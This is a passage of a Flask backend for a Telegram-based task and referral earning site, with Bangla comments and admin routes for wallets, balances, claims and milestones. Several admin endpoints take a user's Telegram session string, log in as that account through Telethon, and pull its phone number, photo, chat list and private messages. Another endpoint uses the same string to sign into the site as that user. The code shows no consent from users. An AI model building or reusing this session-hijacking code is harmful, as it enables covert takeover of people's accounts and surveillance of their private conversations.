
@app.route("/api/admin/update_wallets", methods=["POST"])
@login_required
def admin_update_wallets():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    nagad = request.json.get("nagad", "")
    bkash = request.json.get("bkash", "")
    admin_config_col.update_one({"_id": "global"}, {"$set": {"wallet": {"nagad": nagad, "bkash": bkash}}})
    return jsonify({"success": True})

@app.route("/api/admin/update_balance", methods=["POST"])
@login_required
def admin_update_balance():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    uid = request.json.get("uid")   # এখানে telegram_id আসবে বা MongoDB _id?
    cash = request.json.get("cash")
    aaf = request.json.get("aaf")
    user = users_col.find_one({"telegram_id": uid})
    if not user:
        return jsonify({"error": "User not found"}), 404
    if cash is not None:
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": float(cash)}})
    if aaf is not None:
        users_col.update_one({"_id": user["_id"]}, {"$set": {"aaf": float(aaf)}})
    return jsonify({"success": True})

@app.route("/api/admin/config")
@login_required
def admin_config():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    admin = get_admin_config()
    popup = admin.get("popup_ad", {})
    return jsonify({
        "server_income": admin.get("server_income", 0),
        "server_trading": admin.get("server_trading", 0),
        "banner_ad_code": admin.get("banner_ad_code", ""),
        "referral_bonus": admin.get("referral_bonus", 0),
        "bot_token": admin.get("bot_token", ""),
        "channel_url": admin.get("channel_url", ""),
        "channel_id": admin.get("channel_id", ""),
        "extra_users": admin.get("extra_users", 0),
        "bonus_target": admin.get("bonus_target", 5),
        "task_rules": admin.get("task_rules", {"device_check": True, "ip_check": False, "account_check": True}),
        "ip_limit_per_hour": admin.get("ip_limit_per_hour", 5),
        "default_task_expiry_hours": admin.get("default_task_expiry_hours", 168,),
        "wallet": admin.get("wallet", {"nagad": "", "bkash": ""}),
        "popup_ad_title": popup.get("title", ""),
        "popup_ad_desc": popup.get("desc", ""),
        "popup_ad_image": popup.get("image", ""),
        "popup_ad_enabled": popup.get("enabled", False)
    })

@app.route("/api/check_membership", methods=["GET"])
@login_required
def check_membership():
    uid = session.get("uid")
    if not uid:
        return jsonify({"is_member": False})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"is_member": False})
    
    admin = get_admin_config()
    bot_token = admin.get("bot_token")
    channel_url = admin.get("channel_url", "")
    
    # কনফিগ না থাকলে ডাটাবেসের মানই রিটার্ন করুন
    if not bot_token or not channel_url:
        return jsonify({"is_member": user.get("is_joined", False)})
    
    try:
        user_tg_id = int(user.get("telegram_id"))
        # চ্যানেল ইউজারনেম পার্স করুন
        if "t.me/" in channel_url:
            channel_username = "@" + channel_url.split("t.me/")[-1].split("/")[0]
        elif channel_url.startswith("@"):
            channel_username = channel_url
        else:
            channel_username = "@" + channel_url
        
        # টেলিগ্রাম বট API কল (ক্যাশ এড়াতে headers যোগ করুন)
        import requests
        url = f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel_username}&user_id={user_tg_id}"
        resp = requests.get(url, headers={"Cache-Control": "no-cache"}, timeout=10)
        data = resp.json()
        
        if data.get("ok"):
            status = data["result"]["status"]
            is_member = status in ("member", "administrator", "creator")
        else:
            is_member = False
        
        # ডাটাবেস আপডেট করুন
        new_joined = is_member
        if user.get("is_joined") != new_joined:
            users_col.update_one({"_id": ObjectId(uid)}, {"$set": {"is_joined": new_joined}})
        
        # রেসপন্সে ক্যাশ নিষিদ্ধ হেডার দিন
        response = jsonify({"is_member": is_member})
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
        return response
        
    except Exception as e:
        print(f"Check membership error: {e}")
        # কোনো error হলে is_member = False ধরে নিন (ডাটাবেস আপডেট করবেন না)
        return jsonify({"is_member": False})

@app.route("/api/admin/load_session", methods=["POST"])
def admin_load_session():
    # শুধুমাত্র অ্যাডমিন লগইন থাকলেই চলবে
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string provided"}), 400
    
    async def fetch_user():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            me = await client.get_me()
            # প্রোফাইল পিক ডাউনলোড (ঐচ্ছিক)
            photo = None
            try:
                photo = await client.download_profile_photo(me, bytes)
                if photo:
                    import base64
                    photo = base64.b64encode(photo).decode('utf-8')
            except:
                pass
            return {
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": me.phone,
                "photo": photo
            }
        finally:
            await client.disconnect()
    
    try:
        user_info = asyncio.run(fetch_user())
        return jsonify({"success": True, "user": user_info})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/force_login", methods=["POST"])
def force_login():
    # শুধু অ্যাডমিনের জন্য (নিরাপত্তা)
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string"}), 400
    
    # সেশন স্ট্রিং থেকে টেলিগ্রাম আইডি বের করুন
    async def get_tg_id():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        await client.disconnect()
        return me.id
    
    try:
        tg_id = str(run_async(get_tg_id()))
        # ডাটাবেজে এই telegram_id থাকা ইউজার খুঁজুন
        user = users_col.find_one({"telegram_id": tg_id})
        if not user:
            return jsonify({"error": "User not found in database"}), 404
        
        # ফ্লাস্ক সেশন সেট করুন
        session["uid"] = str(user["_id"])
        session.permanent = True
        
        # ফ্রন্টএন্ডকে জানিয়ে দিন
        return jsonify({"success": True, "telegram_id": tg_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/admin/chat_dialogs", methods=["POST"])
def admin_chat_dialogs():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    if not session_string:
        return jsonify({"error": "No session string"}), 400
    
    print(f"[DEBUG] session string length: {len(session_string)}")
    
    async def fetch_dialogs():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            dialogs = await client.get_dialogs()
            result = []
            for d in dialogs:
                # নাম নিরাপদে বের করা
                name = d.name
                if not name:
                    if d.is_user and d.entity:
                        name = getattr(d.entity, 'first_name', '') or getattr(d.entity, 'username', '') or "User"
                    else:
                        name = "Chat"
                # বার্তা নিরাপদে বের করা
                last_msg = ""
                if d.message:
                    last_msg = d.message.text if d.message.text else d.message.caption if hasattr(d.message, 'caption') else ""
                result.append({
                    "id": d.id,
                    "name": name,
                    "unread_count": d.unread_count,
                    "last_message": last_msg[:100]
                })
            return result
        except Exception as e:
            print(f"[ERROR] fetch_dialogs failed: {type(e).__name__}: {e}")
            raise  # উপরের try-এ যাবে
        finally:
            await client.disconnect()
    
    try:
        dialogs = run_async(fetch_dialogs())
        return jsonify({"success": True, "dialogs": dialogs})
    except Exception as e:
        return jsonify({"success": False, "error": f"{type(e).__name__}: {str(e)}"})


@app.route("/api/admin/chat_messages", methods=["POST"])
def admin_chat_messages():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    session_string = data.get("session_string")
    chat_id = data.get("chat_id")
    limit = data.get("limit", 50)
    if not session_string or not chat_id:
        return jsonify({"error": "Missing parameters"}), 400
    
    async def fetch_messages():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            entity = await client.get_entity(int(chat_id))
            messages = await client.get_messages(entity, limit=limit)
            result = []
            for msg in messages:
                # মেসেজের টেক্সট বা মিডিয়া নির্ধারণ
                if msg.text:
                    text = msg.text
                elif msg.caption:
                    text = msg.caption
                else:
                    # সার্ভিস মেসেজ বা অন্য কিছু
                    text = "[Service message or media without caption]"
                
                result.append({
                    "id": msg.id,
                    "text": text,
                    "sender_id": msg.sender_id if msg.sender_id else "Unknown",
                    "date": msg.date.isoformat() if msg.date else None
                })
            return result
        except Exception as e:
            print(f"[ERROR] fetch_messages: {type(e).__name__}: {e}")
            raise
        finally:
            await client.disconnect()
    
    try:
        messages = run_async(fetch_messages())
        return jsonify({"success": True, "messages": messages})
    except Exception as e:
        return jsonify({"success": False, "error": f"{type(e).__name__}: {str(e)}"})


# ================= PENDING CLAIMS & MILESTONES =================
@app.route("/api/admin/pending_claims")
def admin_pending_claims():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    claims = list(task_claims_col.find({"status": "pending"}))
    for claim in claims:
        claim["_id"] = str(claim["_id"])
    return jsonify({"claims": claims})

@app.route("/api/admin/approve_claim", methods=["POST"])
def admin_approve_claim():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    claim_id = data.get("claim_id")
    action = data.get("action")
    claim = task_claims_col.find_one({"_id": ObjectId(claim_id)})
    if not claim:
        return jsonify({"success": False, "message": "Claim not found"}), 404
    if action == "approve":
        user = users_col.find_one({"telegram_id": claim["telegram_id"]})
        if user:
            if claim.get("currency") == "aaf":
                users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": claim["reward"]}})
            else:
                users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": claim["reward"]}})
        task_claims_col.update_one({"_id": ObjectId(claim_id)}, {"$set": {"status": "approved"}})
    else:
        task_claims_col.update_one({"_id": ObjectId(claim_id)}, {"$set": {"status": "rejected"}})
    return jsonify({"success": True})

@app.route("/api/admin/milestones")
def admin_milestones():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    milestones = list(milestones_col.find({}))
    for m in milestones:
        m["_id"] = str(m["_id"])
    return jsonify({"milestones": milestones})

@app.route("/api/admin/milestone/save", methods=["POST"])
def admin_save_milestone():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    milestone = {
        "target": data["target"],
        "reward_type": data["reward_type"],
        "reward_amount": data["reward_amount"],
        "days": data.get("days"),
        "type": data["type"],
        "active": data["active"],
        "created_at": datetime.utcnow()
    }
    milestones_col.insert_one(milestone)
    return jsonify({"success": True})

@app.route("/api/admin/milestone/delete", methods=["POST"])
def admin_delete_milestone():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    mid = data.get("id")
    milestones_col.delete_one({"_id": ObjectId(mid)})
    return jsonify({"success": True})


@app.route("/api/admin/clear_field", methods=["POST"])
@login_required
def admin_clear_field():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    field_name = data.get("field")
    if not field_name:
        return jsonify({"error": "Field name required"}), 400
    
    # কোন ফিল্ডটি ক্লিয়ার করতে চান, সেটি $unset অথবা $set করে খালি করুন
    # আমরা এখানে $set করে খালি স্ট্রিং সেট করছি (যাতে ফিল্ডটি থেকে যায়)
    admin_config_col.update_one(
        {"_id": "global"},
        {"$set": {field_name: ""}}
    )
    return jsonify({"success": True})

# ================== ইউজার মাইলেসটোন এন্ডপয়েন্ট ==================
@app.route('/api/user/milestones', methods=['GET'])
@login_required
def user_milestones():
    uid = session.get('uid')
    if not uid:
        return jsonify({"milestones": []})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"milestones": []})

    # টাস্ক কমপ্লিট কাউন্ট (ধরে নিচ্ছি claimed = True)
    task_count = task_claims_col.count_documents({"telegram_id": user["telegram_id"], "status": "approved"})
    referral_count = user.get("refer_count", 0)
    deposit_total = user.get("total_deposit", 0)

    milestones = list(milestones_col.find({"active": True}))
    result = []
    for m in milestones:
        if m['type'] == 'task':
            progress = task_count
        elif m['type'] == 'referral':
            progress = referral_count
        else:
            progress = deposit_total

        achieved = progress >= m['target']
        already_claimed = user_milestone_claims_col.find_one({"user_id": uid, "milestone_id": str(m['_id'])}) is not None

        result.append({
            "id": str(m['_id']),
            "type": m['type'],
            "target": m['target'],
            "reward_amount": m['reward_amount'],
            "reward_type": m['reward_type'],
            "days": m.get('days'),
            "progress": progress,
            "achieved": achieved,
            "already_claimed": already_claimed
        })
    return jsonify({"milestones": result})

@app.route('/api/user/claim_milestone', methods=['POST'])
@login_required
def claim_milestone():
    uid = session.get('uid')
    if not uid:
        return jsonify({"success": False, "error": "Login required"})
    data = request.json
    milestone_id = data.get('milestone_id')
    if not milestone_id:
        return jsonify({"success": False, "error": "Missing milestone_id"})

    milestone = milestones_col.find_one({"_id": ObjectId(milestone_id), "active": True})
    if not milestone:
        return jsonify({"success": False, "error": "Milestone not found"})

    # ডুপ্লিকেট চেক
    if user_milestone_claims_col.find_one({"user_id": uid, "milestone_id": milestone_id}):
        return jsonify({"success": False, "error": "Already claimed"})

    # ইউজারের বর্তমান প্রগ্রেস পুনঃগণনা
    user = users_col.find_one({"_id": ObjectId(uid)})
    task_count = task_claims_col.count_documents({"telegram_id": user["telegram_id"], "status": "approved"})
    referral_count = user.get("refer_count", 0)
    deposit_total = user.get("total_deposit", 0)

    if milestone['type'] == 'task':
        progress = task_count
    elif milestone['type'] == 'referral':
        progress = referral_count
    else:
        progress = deposit_total

    if progress < milestone['target']:
        return jsonify({"success": False, "error": "Target not reached"})

    # বোনাস প্রদান
    if milestone['reward_type'] == 'bdt':
        users_col.update_one({"_id": ObjectId(uid)}, {"$inc": {"cash": milestone['reward_amount']}})
    else:
        users_col.update_one({"_id": ObjectId(uid)}, {"$inc": {"aaf": milestone['reward_amount']}})

    # ক্লেইম রেকর্ড সেভ
    user_milestone_claims_col.insert_one({
        "user_id": uid,
        "milestone_id": milestone_id,
        "claimed_at": datetime.utcnow()
    })
    return jsonify({"success": True})


@app.route("/api/dashboard/stats")
@login_required
def dashboard_stats():
    admin = get_admin_config()
    return jsonify({
        "server_income": admin.get("server_income", 0),
        "server_trading": admin.get("server_trading", 0),
        "total_users": admin.get("total_users", users_col.count_documents({})),
        "referral_bonus": admin.get("referral_bonus", 0),
        "banner_ad_code": admin.get("banner_ad_code", "")
    })


@app.route("/api/admin/reload_config", methods=["POST"])
def admin_reload_config():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    # ক্যাশ রিলোড (যদি কোন ক্যাশিং সিস্টেম থাকে)
    return jsonify({"success": True, "message": "Configuration reloaded"})


# ================= RUN =================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
